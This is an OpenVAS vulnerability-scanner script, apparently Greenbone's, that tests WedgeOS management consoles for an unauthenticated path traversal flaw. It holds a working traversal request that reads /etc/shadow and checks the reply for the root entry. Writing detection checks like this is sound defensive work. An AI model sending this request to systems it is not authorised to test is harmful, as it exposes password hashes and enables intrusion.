###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wedgeOS_lfi_07_15.nasl 11872 2018-10-12 11:22:41Z cfischer $
#
# WedgeOS Multiple Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wedge_networks:wedgeos";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105311");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:N");
  script_version("$Revision: 11872 $");

  script_name("WedgeOS Multiple Vulnerabilities");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Jun/86");

  script_tag(name:"vuldetect", value:"Try to read /etc/shadow via a special crafted HTTP GET request");

  script_tag(name:"solution", value:"Update to WedgeOS > 4.0.4");

  script_tag(name:"summary", value:"Wedge Networks WedgeOS contains a number of security vulnerabilities, including unauthenticated arbitrary
file read as root, command injection in the web interface, privilege escalation to root, and command execution via the system update
functionality.");

  script_tag(name:"affected", value:"WedgeOS <= 4.0.4");
  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-07-02 13:50:31 +0200 (Thu, 02 Jul 2015)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
  script_dependencies("gb_wedgeos_management_console_detect.nasl");
  script_require_ports("Services/www", 443);
  script_mandatory_keys("wedgeOS/management_console/installed");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );

url = '/ssgmanager/ssgimages?name=../../../../../etc/shadow';

if( shadow = http_vuln_check( port:port, url:url, pattern:"root:.*:0:" ) )
{
  line = egrep( pattern:'root:.*:0:', string:shadow );
  line = chomp( line );

  report = 'By requesting "https://' + get_host_name() + url + '" it was possible to retrieve the content\nof /etc/shadow.\n\n[...] ' + line + ' [...]\n';
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
